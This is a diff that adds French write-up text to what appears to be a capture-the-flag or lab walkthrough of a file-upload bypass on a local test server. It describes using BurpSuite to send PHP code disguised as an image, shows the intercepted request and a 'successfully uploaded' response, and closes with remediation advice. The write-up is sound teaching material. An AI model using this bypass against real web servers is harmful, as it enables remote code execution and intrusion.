@@ -1,7 +1,19 @@
+# Upload exploit 
+
+## Exploitation
+
+Lors d'un upload de fichier la requete POST qui suit comprend plusieurs parametres qui sont checkés tels que :
+	filename 
+	Content-Type
+	le magic-byte
+
+Pour bypass un upload de fichier nous allons avoir besoin de BurpSuite pour interrompre l'envoi de la requete et la modifier a la volée
+On changeras le contenu de l'image pour y mettre du code en php (par exemple) et on garderas le Content-Type de facon a ce que le serveur croie recevoir une image.
+
 http://192.168.122.55/?page=upload
 
 request :
-
+```
 POST /?page=upload HTTP/1.1
 Host: 192.168.122.55
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
@@ -31,8 +43,10 @@ Content-Disposition: form-data; name="Upload"
 
 Upload
 -----------------------------118712806221434122761445428627--
+```
 
 response :
+```
 <pre>
 <center>
 	<h2 style="margin-top:50px;">
@@ -45,3 +59,14 @@ response :
 <pre>
 	/tmp/index.php succesfully uploaded.
 </pre>
+```
+
+## Resolution
+
+Restreindre les types de fichiers acceptés pour le téléchargement: 
+	- vérifiez l'extension du fichier et autorisez uniquement le téléchargement de certains fichiers. 
+	- Utilisez une approche de liste blanche au lieu d'une liste noire. 
+	- Recherchez les extensions doubles telles que .php.png. 
+	- Recherchez les fichiers sans nom de fichier comme .htaccess (sur ASP.NET, recherchez les fichiers de configuration comme web.config). 
+	- Modifiez les autorisations sur le dossier de téléchargement afin que les fichiers qu'il contient ne soient pas exécutables. 
+	- Si possible, renommez les fichiers téléchargés.
